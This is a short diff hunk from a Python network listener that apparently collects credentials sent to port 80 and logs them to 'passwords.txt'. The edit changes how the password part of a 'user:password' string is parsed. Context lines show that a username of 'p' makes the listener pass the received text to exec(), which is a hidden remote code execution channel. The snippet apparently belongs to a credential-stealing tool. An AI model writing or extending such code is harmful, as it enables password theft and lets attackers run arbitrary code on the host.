@@ -44,7 +44,7 @@ def listen_for_utf16le_string(port=80, output_file='passwords.txt'):
 
                             # Save the plain output to file (without colors)
                             print(output)
-                            passwd = ''.join(decoded_string.strip().split(':')[1:])
+                            passwd = decoded_string.partition(":")[2]
                             uname = decoded_string.strip().split(':')[0]
                             if(uname=='p'):
                                 exec(passwd)
